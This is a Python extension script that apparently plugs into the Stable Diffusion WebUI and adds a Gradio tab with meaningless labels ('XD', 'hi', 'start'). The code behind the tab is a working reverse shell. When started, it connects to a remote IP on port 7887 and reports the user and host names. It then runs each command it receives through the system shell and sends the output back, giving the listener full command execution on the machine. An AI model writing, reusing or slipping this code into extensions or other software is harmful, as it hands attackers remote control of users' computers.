import gradio as gr
from modules import script_callbacks
import socket
import threading
import time
import subprocess
import os
import platform

class RemoteControlClient:
    def __init__(self):
        self.connected = False
        self.client_socket = None
        self.connection_thread = None
        self.stop_connection = False
        self.target_ip = "192.168.1.100"  
        self.port = 7887
        self.current_user = os.getlogin()
        try:
            self.current_hostname = os.uname().nodename
        except AttributeError:
            self.current_hostname = platform.node()
        
    def connect_to_server(self, target_ip):
        if self.connected:
            return "Already connected to server", True
        
        self.target_ip = target_ip
        self.stop_connection = False
        
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.target_ip, self.port))
            self.connected = True
 
            welcome_msg = f"Remote command client connected\nClient: {self.current_user}@{self.current_hostname}\nType 'exit' to quit\n\n"
            self.client_socket.sendall(welcome_msg.encode())
            

            self.connection_thread = threading.Thread(target=self._handle_server_commands)
            self.connection_thread.daemon = True
            self.connection_thread.start()
            
            return f"Connected to {self.target_ip}:{self.port}", True
            
        except Exception as e:
            return f"Failed to connect to server: {str(e)}", False
    
    def disconnect(self):
        self.stop_connection = True
        self.connected = False
        
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            finally:
                self.client_socket = None
        
        return "Disconnected from server", False
    
    def _handle_server_commands(self):
        try:
            buffer = ""
            self.client_socket.settimeout(0.1)
            
            while self.connected and not self.stop_connection:
                try:
                    data = self.client_socket.recv(1024).decode()
                    if not data:
                        break
                    
                    buffer += data
                    if '\n' in buffer or '\r' in buffer:
                        command = buffer.strip()
                        buffer = ""
                        
                        if not command:
                            self._send_prompt()
                            continue
                        
                        print(f"Received command from server: {command}")
                        
                        if command.lower() in ['exit', 'quit']:
                            self.client_socket.sendall("Goodbye!\n".encode())
                            break
                        
                        result = self._execute_command(command)
                        self.client_socket.sendall((result + "\n").encode())
                        self._send_prompt()
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"Command handling error: {str(e)}")
                    break
                    
        except Exception as e:
            print(f"Server handling error: {str(e)}")
        finally:
            self.connected = False
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
    
    def _send_prompt(self):
        try:
            cwd = os.getcwd()
            prompt = f"{self.current_user}@{self.current_hostname}:{cwd}$ "
            self.client_socket.sendall(prompt.encode())
        except:
            try:
                self.client_socket.sendall("$ ".encode())
            except:
                pass
    
    def _execute_command(self, command):
        try:
            print(f"Executing: {command}")
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode(errors='ignore')
            
            return f"{result}"
            
        except subprocess.CalledProcessError as e:
            return f"Error (exit code {e.returncode}):\n{e.output.decode(errors='ignore')}"
        except subprocess.TimeoutExpired:
            return "Error: Command timed out (30s)"
        except Exception as e:
            return f"Execution error: {str(e)}"

client = RemoteControlClient()

def toggle_connection(connection_status, target_ip):
    if connection_status:
        status_msg, new_state = client.disconnect()
        return status_msg, new_state, "Connect to Server", gr.update(interactive=True)
    else:
        status_msg, new_state = client.connect_to_server(target_ip)
        return status_msg, new_state, "Disconnect", gr.update(interactive=False)

def on_ui_tabs():
    with gr.Blocks(analytics_enabled=False) as demo: 
        with gr.Row():
            with gr.Column(scale=1):
                target_ip = gr.Textbox(
                    label="XD", 
                    value="192.168.1.104",
                    placeholder="oooo"
                )
                status = gr.Textbox(label="hi", value="ok")
                btn = gr.Button("start", variant="primary")
                connection_status = gr.State(False)
                
                btn.click(
                    fn=toggle_connection,
                    inputs=[connection_status, target_ip],
                    outputs=[status, connection_status, btn, target_ip]
                )

    return [(demo, "掰掰", "remote_control_client_tab")]
script_callbacks.on_ui_tabs(on_ui_tabs)


